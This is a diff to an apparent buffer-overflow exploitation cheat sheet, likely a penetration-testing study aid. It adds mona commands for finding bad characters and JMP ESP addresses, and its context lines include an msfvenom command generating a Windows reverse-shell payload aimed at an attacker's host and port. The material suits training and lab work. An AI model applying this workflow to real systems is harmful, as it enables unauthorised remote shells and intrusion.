@@ -35,10 +35,19 @@ pattern_offset.rb -l [crash application number] -q [EIP]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 4) FIND BAD CHARACTERS:
 https://github.com/cytopia/badchars
+
+FIND BAD CHARACTERS WITH MONA:
+1) !mona config -set workingdirectory C:\[working folder]
+2) !mona bytearray -cpb "\x00"
+3) RUN python3 BAD CHARACTER FINDING SCRIPT
+4) !mona compare -f c:\[working folder]\bytearray.bin -a [ESP ADDRESS]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 5) FIND RIGHT MODULE:
 !mona modules
 !mona find -s "\xff\xe4" -m [module]
+
+FIND JMP ESP WITH MONA:
+1) !mona find -r ESP -m "[module]"
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 6) CREATE PAYLOAD:
 msfvenom -p windows/shell_reverse_tcp LHOST=[local ip] LPORT=[local port] EXITFUNC=thread -f c -a x86 -b "\00\bad_characters"
